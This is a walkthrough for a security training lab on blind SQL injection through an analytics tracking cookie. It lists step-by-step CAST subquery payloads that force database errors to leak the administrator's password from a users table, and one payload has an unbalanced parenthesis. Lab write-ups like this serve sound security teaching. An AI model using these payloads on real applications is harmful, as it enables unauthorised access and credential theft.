
## Description:

this lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics and performs a SQL query containing the value of the submitted cookie, the results of the query are not returned

the database contains a table called 'users', with columns 'username' and 'password', to solve the lab leak the password of the administrator user

## Solution:

test a simple quote [ ' ] in the trackingid cookie \\\\ this will return an error which shows how the query is being made

append a generic SELECT subquery and cast the return value to a 'int' data type

	[cookie-value]' AND CAST((SELECT 1) AS int)-- \\ this will return an error saying that the argument of AND must be type boolean and not integer

turn it into a boolean argument by making a comparison such as:

	[cookie-value]' AND 1=CAST((SELECT 1) AS int)-- \\ this will not return an error

leaking some info using cast() to generate an error message

	[cookie-value]' AND 1=CAST((SELECT version() AS int)-- 

however trying to leak other info will not work, int the return error it is possible to see that the query is being truncated to a certain length

remove [cookie-value] to free some space

	' AND 1=CAST((SELECT username FROM users) AS int)-- \\ this will return an error saying that a subquery returned more than one row

limit the number of rows in the response

	' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- \\ this will return an error showing that the first username is administrator

knowing 'administrator' is the first username, then the first password will also be his

	 ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- \\ this will return an error showing the administrator password

